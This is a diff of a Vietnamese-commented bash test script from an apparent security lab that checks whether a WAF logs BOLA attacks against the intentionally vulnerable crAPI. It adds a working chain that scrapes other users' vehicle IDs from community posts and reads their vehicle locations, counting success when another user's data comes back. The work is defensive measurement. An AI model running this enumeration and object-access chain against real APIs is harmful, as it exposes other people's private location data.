@@ -31,26 +31,44 @@ own_json="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 "$B
 own_uuid="$(printf '%s' "$own_json" | grep -oE '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}' | head -1)"
 log "vehicle của testuser01: ${own_uuid:-<none>}"
 
-# Tập UUID để thử BOLA: của mình + vài UUID "đoán" (enumeration cổ điển của crAPI).
+# Đóng sổ 2026-10-04 — SỬA LỖI CÔNG CỤ: các bản trước thử UUID "đoán" (649acfac-…0001…) và coi MỌI mã từ app
+# (kể cả 404) là "BOLA tới được". Log 2026-09-13, 2026-09-26 và lần đầu 2026-10-04 đều 404 → chưa vòng nào đo trên
+# một vụ BOLA THÀNH CÔNG; số "CRS = 0 trên BOLA" trước đây là CRS = 0 trên request 404. Nay đi đúng chuỗi BOLA của
+# crAPI: (1) lộ vehicleid của người khác qua community/posts (trường author.vehicleid), (2) đọc
+# vehicle/{id}/location của họ. Chỉ tính là BOLA khi trả 200 VÀ email chủ xe ≠ kẻ tấn công.
+ATTACKER_EMAIL="testuser01@ztlab.local"
 declare -a TARGETS=()
-[[ -n "$own_uuid" ]] && TARGETS+=("$own_uuid")
-TARGETS+=(
-  "649acfac-10ea-4c8f-b1d1-7f2b3f7f0001"
-  "649acfac-10ea-4c8f-b1d1-7f2b3f7f0002"
-  "00000000-0000-4000-8000-000000000001"
-  "11111111-1111-4111-8111-111111111111"
-)
+mapfile -t TARGETS < <(for off in 0 30 60 90 120 150 180 210 240 270; do
+    curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 \
+      "$BFF_URL/community/api/v2/community/posts/recent?limit=30&offset=$off"; echo; done \
+  | python3 -c 'import json,sys
+seen={}
+for l in sys.stdin:
+    try: d=json.loads(l)
+    except Exception: continue
+    for p in d.get("posts",[]):
+        a=p.get("author") or {}
+        if a.get("vehicleid") and a.get("email")!=sys.argv[1]: seen[a["vehicleid"]]=a["email"]
+print("\n".join(seen))' "$ATTACKER_EMAIL")
+log "vehicleid của người khác lộ qua community/posts: ${#TARGETS[@]} (${TARGETS[*]})"
+[[ ${#TARGETS[@]} -ge 1 ]] || fail "không tìm thấy vehicleid nào của người khác qua community/posts — seed thiếu dữ liệu nạn nhân"
 
+# Mốc [T0,T1] TƯỜNG MINH bao trọn đúng lưu lượng BOLA của lần chạy NÀY — dùng
+# để truy vấn Loki tất định (Phần 1.1 remediation 2026-09), không dùng cửa sổ
+# trượt "10 phút gần nhất" (phụ thuộc thời điểm gọi, ăn log của lần chạy khác
+# khi gọi lặp lại nhanh — đây là nguyên nhân gốc của FAIL=4 giả trước đó).
+T0="$(date +%s)"
 echo "---- BOLA requests (HTTP code) ----"
 reached=0
 for u in "${TARGETS[@]}"; do
-  for ep in "location" "" ; do
-    path="/identity/api/v2/vehicle/${u}/${ep}"
-    code="$(crapi_call "$J" GET "$path")"
-    printf '  GET %-58s -> %s\n' "$path" "$code"
-    # 2xx/4xx từ ứng dụng = request tới được app (không bị chặn ở biên/TLS)
-    [[ "$code" =~ ^(200|401|403|404|422|500)$ ]] && reached=$((reached + 1))
-  done
+  path="/identity/api/v2/vehicle/${u}/location"
+  body="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 -w '\n%{http_code}' "$BFF_URL$path")"
+  code="${body##*$'\n'}"; owner="$(printf '%s' "${body%$'\n'*}" | python3 -c 'import json,sys
+try: print(json.load(sys.stdin).get("email",""))
+except Exception: print("")')"
+  printf '  GET %-58s -> %s  chủ xe=%s\n' "$path" "$code" "${owner:-?}"
+  # BOLA THÀNH CÔNG = 200 + đọc được dữ liệu của NGƯỜI KHÁC
+  [[ "$code" == "200" && -n "$owner" && "$owner" != "$ATTACKER_EMAIL" ]] && reached=$((reached + 1))
 done
 # Vài endpoint rò rỉ đối tượng khác của crAPI (mass-assignment / object exposure)
 for path in \
@@ -60,18 +78,22 @@ for path in \
   code="$(crapi_call "$J" GET "$path")"
   printf '  GET %-58s -> %s\n' "$path" "$code"
 done
+# +1: `date +%s` làm tròn XUỐNG; dòng audit CRS của request cuối có phần lẻ giây sau T1 và bị loại khỏi
+# (T0,T1] — đúng lỗi đã sửa ở crapi_sqli_waf.sh vòng 4 nhưng sót ở đây. Với BOLA lỗi này thiên về kết
+# quả KỲ VỌNG (0 CRS hit), nên phải sửa trước khi trích số đối chứng (đóng sổ 2026-10-04).
+T1="$(( $(date +%s) + 1 ))"
 
-[[ $reached -ge 1 ]] || fail "không request BOLA nào tới được ứng dụng — có gì đó chặn ở biên (không mong đợi)"
-log "Các request BOLA tới được ứng dụng ($reached) — ZTA không vá lỗ hổng app (đúng chủ đích)"
+[[ $reached -ge 1 ]] || fail "không vụ BOLA nào THÀNH CÔNG (200 + dữ liệu của người khác) — không có gì để đo đối chứng"
+log "BOLA thành công $reached/${#TARGETS[@]}: đọc được vị trí xe của người khác — ZTA không vá lỗ hổng app (đúng chủ đích)"
 
-sleep 4
-echo "---- ĐO ĐỐI CHỨNG: CRS/WAF audit cho path BOLA ----"
-crs_bola="$(loki_count '{job="waf-audit"} |~ "vehicle/[^/]+/location"')"
-crs_any="$(loki_count '{job="waf-audit"} |~ "attack-"')"
-crs_total="$(loki_count '{job="waf-audit"} |~ "\"transaction\""')"
+sleep 4   # đợi Promtail batchwait(1s) + ingest Loki trước khi truy vấn — [T0,T1] giữ nguyên, không dịch theo sleep này
+echo "---- ĐO ĐỐI CHỨNG: CRS/WAF audit cho path BOLA — khoảng thời gian tường minh [T0=$T0, T1=$T1], KHÔNG dùng cửa sổ trượt ----"
+crs_bola="$(loki_count '{job="waf-audit"} |~ "vehicle/[^/]+/location"' "$T0" "$T1")"
+crs_any="$(loki_count '{job="waf-audit"} |~ "attack-"' "$T0" "$T1")"
+crs_total="$(loki_count '{job="waf-audit"} |~ "\"transaction\""' "$T0" "$T1")"
 echo "  CRS hit trên path BOLA (vehicle/{id}/location)   = $crs_bola   [kỳ vọng 0]"
-echo "  CRS hit gắn tag tấn công (attack-*) trong 10m     = $crs_any"
-echo "  CRS transaction audited tổng trong 10m            = $crs_total"
+echo "  CRS hit gắn tag tấn công (attack-*) trong [T0,T1]  = $crs_any"
+echo "  CRS transaction audited tổng trong [T0,T1]         = $crs_total"
 
 if [[ "$crs_bola" != "0" ]]; then
   fail "$SCENARIO — CRS GHI NHẬN $crs_bola bản ghi trên kịch bản BOLA — điều tra: script có gửi payload bất thường? CRS bắt nhầm? (xem KEHOACH: đây là dấu hiệu bất thường)"
